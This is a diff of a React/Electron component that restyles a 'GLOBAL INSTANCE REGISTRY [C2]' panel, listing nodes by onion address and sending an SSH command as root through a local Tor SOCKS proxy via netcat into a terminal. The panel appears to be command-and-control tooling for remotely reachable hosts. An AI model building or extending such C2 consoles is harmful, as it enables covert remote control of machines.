@@ -1,4 +1,139 @@
 import React, { useState, useEffect } from 'react';
+import styled, { keyframes } from 'styled-components';
+import { HardDrive, RefreshCw, Link, Smartphone, AlertTriangle } from 'lucide-react';
+
+const slideIn = keyframes`
+    from { opacity: 0; transform: translateX(-20px); }
+    to { opacity: 1; transform: translateX(0); }
+`;
+
+const Root = styled.div`
+    padding: 30px;
+    color: ${props => props.theme.colors.text};
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+    gap: 30px;
+`;
+
+const Header = styled.div`
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid ${props => props.theme.colors.border};
+    padding-bottom: 20px;
+`;
+
+const Title = styled.h2`
+    margin: 0;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    font-size: 1.1rem;
+    font-weight: 800;
+    color: ${props => props.theme.colors.primary};
+`;
+
+const RefreshButton = styled.button`
+    background: transparent;
+    border: 1px solid ${props => props.theme.colors.primary};
+    color: ${props => props.theme.colors.primary};
+    padding: 12px 25px;
+    border-radius: 12px;
+    cursor: pointer;
+    font-size: 0.8rem;
+    font-weight: 800;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    transition: 0.3s;
+    min-height: 50px;
+
+    &:hover {
+        background: ${props => props.theme.colors.primary}11;
+        box-shadow: 0 0 10px ${props => props.theme.colors.glow};
+    }
+`;
+
+const ErrorMsg = styled.div`
+    background: ${props => props.theme.colors.error}11;
+    color: ${props => props.theme.colors.error};
+    border: 1px solid ${props => props.theme.colors.error}44;
+    padding: 20px;
+    border-radius: 15px;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 0.8rem;
+    text-transform: uppercase;
+`;
+
+const TableContainer = styled.div`
+    flex: 1;
+    overflow-y: auto;
+    ${props => props.theme.effects.glass}
+    background: ${props => props.theme.colors.glass};
+    border-radius: 25px;
+    padding: 15px;
+    -webkit-overflow-scrolling: touch;
+`;
+
+const StyledTable = styled.table`
+    width: 100%;
+    border-collapse: separate;
+    border-spacing: 0 10px;
+`;
+
+const Th = styled.th`
+    text-align: left;
+    padding: 15px 25px;
+    font-size: 0.7rem;
+    text-transform: uppercase;
+    color: ${props => props.theme.colors.textSecondary};
+    letter-spacing: 2px;
+    font-weight: 800;
+`;
+
+const Td = styled.td`
+    padding: 22px 25px;
+    background: #fff;
+    font-size: 0.95rem;
+    font-weight: 600;
+    transition: 0.3s;
+
+    &:first-child { border-radius: 15px 0 0 15px; border-left: 1px solid ${props => props.theme.colors.border}44; }
+    &:last-child { border-radius: 0 15px 15px 0; border-right: 1px solid ${props => props.theme.colors.border}44; }
+`;
+
+const Tr = styled.tr`
+    animation: ${slideIn} 0.4s ease-out backwards;
+    animation-delay: ${props => props.index * 0.04}s;
+    &:hover ${Td} {
+        background: #F8FAFC;
+    }
+`;
+
+const ConnectButton = styled.button`
+    background: ${props => props.theme.colors.primary};
+    color: #fff;
+    border: none;
+    padding: 12px 20px;
+    border-radius: 10px;
+    font-size: 0.75rem;
+    font-weight: 800;
+    cursor: pointer;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    transition: 0.3s;
+    min-height: 45px;
+
+    &:hover {
+        background: #0088CC;
+        box-shadow: 0 5px 15px rgba(0, 170, 255, 0.3);
+    }
+`;
 
 const ipcRenderer = (typeof window !== 'undefined' && window.electronAPI)
     ? window.electronAPI.ipcRenderer
@@ -13,7 +148,6 @@ const MasterConsole = () => {
         setLoading(true);
         setError('');
         try {
-            // We use the AI command bridge to query the C2 registry via a local python helper
             const result = await ipcRenderer.invoke('ai.command', 'internal.c2_list');
             const data = JSON.parse(result);
             if (Array.isArray(data)) {
@@ -32,85 +166,72 @@ const MasterConsole = () => {
         fetchRegistry();
     }, []);
 
-    const containerStyle = {
-        padding: '20px',
-        color: '#00AAFF',
-        height: '100%',
-        display: 'flex',
-        flexDirection: 'column',
-        gap: '20px'
-    };
-
-    const tableStyle = {
-        width: '100%',
-        borderCollapse: 'collapse',
-        background: 'rgba(0, 170, 255, 0.03)'
-    };
-
-    const thTdStyle = {
-        border: '1px solid rgba(0, 170, 255, 0.2)',
-        padding: '12px',
-        textAlign: 'left',
-        fontSize: '12px'
-    };
-
     const connectToInstance = (onion) => {
         const cmd = `ssh -o "ProxyCommand=nc -X 5 -x 127.0.0.1:9050 %h %p" root@${onion}`;
         ipcRenderer.send('terminal.keystroke', `${cmd}\r`);
-        alert('CONNECTION STRING PIPED TO MAIN_SHELL');
+        // Visual confirmation could be better than alert
     };
 
     return (
-        <div style={containerStyle}>
-            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid #00AAFF', paddingBottom: '10px' }}>
-                <h2 style={{ margin: 0, letterSpacing: '2px' }}>GLOBAL INSTANCE REGISTRY [C2]</h2>
-                <button 
-                    onClick={fetchRegistry}
-                    style={{ background: 'transparent', border: '1px solid #00AAFF', color: '#00AAFF', padding: '5px 15px', cursor: 'pointer' }}
-                >
+        <Root>
+            <Header>
+                <Title>GLOBAL INSTANCE REGISTRY [C2]</Title>
+                <RefreshButton onClick={fetchRegistry}>
+                    <RefreshCw size={18} className={loading ? 'spin' : ''} />
                     REFRESH_NODES
-                </button>
-            </div>
+                </RefreshButton>
+            </Header>
 
-            {error && <div style={{ color: '#ff0000', border: '1px solid #ff0000', padding: '10px' }}>&gt; {error}</div>}
+            {error && (
+                <ErrorMsg>
+                    <AlertTriangle size={20} />
+                    {error}
+                </ErrorMsg>
+            )}
 
-            <div style={{ flex: 1, overflowY: 'auto' }}>
-                <table style={tableStyle}>
+            <TableContainer>
+                <StyledTable>
                     <thead>
-                        <tr style={{ background: 'rgba(0, 170, 255, 0.05)' }}>
-                            <th style={thTdStyle}>INSTANCE_ID</th>
-                            <th style={thTdStyle}>ONION_UPLINK</th>
-                            <th style={thTdStyle}>PLATFORM</th>
-                            <th style={thTdStyle}>LAST_SEEN</th>
-                            <th style={thTdStyle}>ACTIONS</th>
+                        <tr>
+                            <Th>INSTANCE_ID</Th>
+                            <Th>ONION_UPLINK</Th>
+                            <Th>PLATFORM</Th>
+                            <Th>LAST_SEEN</Th>
+                            <Th>ACTIONS</Th>
                         </tr>
                     </thead>
                     <tbody>
                         {instances.map((node, i) => (
-                            <tr key={node.id} style={{ background: i % 2 === 0 ? 'rgba(0,0,0,0.5)' : 'transparent' }}>
-                                <td style={thTdStyle}>{node.id}</td>
-                                <td style={{...thTdStyle, color: 'rgba(0, 170, 255, 0.8)'}}>{node.onion}</td>
-                                <td style={thTdStyle}>{node.metadata?.platform || 'UNKNOWN'}</td>
-                                <td style={thTdStyle}>{new Date(node.last_seen).toLocaleString()}</td>
-                                <td style={thTdStyle}>
-                                    <button 
-                                        onClick={() => connectToInstance(node.onion)}
-                                        style={{ background: '#00AAFF', color: '#000', border: 'none', padding: '2px 10px', fontWeight: 'bold', cursor: 'pointer' }}
-                                    >
+                            <Tr key={node.id} index={i}>
+                                <Td style={{ color: '#34495E', fontFamily: 'monospace' }}>{node.id.slice(0, 12)}...</Td>
+                                <Td style={{ color: '#00AAFF', fontSize: '0.85rem' }}>{node.onion}</Td>
+                                <Td>
+                                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                                        <Smartphone size={14} style={{ opacity: 0.5 }} />
+                                        {node.metadata?.platform || 'UNKNOWN'}
+                                    </div>
+                                </Td>
+                                <Td style={{ color: '#7F8C8D', fontSize: '0.8rem' }}>{new Date(node.last_seen).toLocaleTimeString()}</Td>
+                                <Td>
+                                    <ConnectButton onClick={() => connectToInstance(node.onion)}>
+                                        <Link size={14} style={{ marginRight: '8px' }} />
                                         CONNECT
-                                    </button>
-                                </td>
-                            </tr>
+                                    </ConnectButton>
+                                </Td>
+                            </Tr>
                         ))}
                         {instances.length === 0 && !loading && (
                             <tr>
-                                <td colSpan="5" style={{...thTdStyle, textAlign: 'center', padding: '40px'}}>NO ACTIVE NODES DETECTED IN GRID.</td>
+                                <Td colSpan="5" style={{ textAlign: 'center', padding: '80px', opacity: 0.3 }}>
+                                    <HardDrive size={40} style={{ marginBottom: '15px' }} /><br />
+                                    NO ACTIVE NODES DETECTED IN GRID.
+                                </Td>
                             </tr>
                         )}
                     </tbody>
-                </table>
-            </div>
-        </div>
+                </StyledTable>
+            </TableContainer>
+        </Root>
     );
 };
 
